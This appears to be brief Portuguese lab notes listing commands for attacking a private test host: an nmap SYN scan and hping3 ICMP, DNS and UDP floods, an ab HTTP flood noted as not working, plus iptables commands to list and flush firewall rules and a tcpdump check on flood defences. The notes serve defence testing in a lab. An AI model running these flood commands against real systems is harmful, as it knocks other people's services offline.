Ataques:
port scaning e syn flood -> sudo nmap -sS 10.0.0.20

ping flood -> sudo hping3 -1 --flood 10.0.0.20

dns flood -> sudo hping3 -2 -p 53 --flood 10.0.0.20

http flood -> ab -n 100 -c 50 http://10.0.0.20/ # nao funciona

udp flood -> sudo hping3 --udp -p 80 --flood 10.0.0.20


Ver iptables:
-> sudo iptables -L

Limpar iptables:
-> sudo iptables -F

TCPDUMP: pra verificar defesa de ataques flood:
-> sudo tcpdump -i eth2 udp port 53
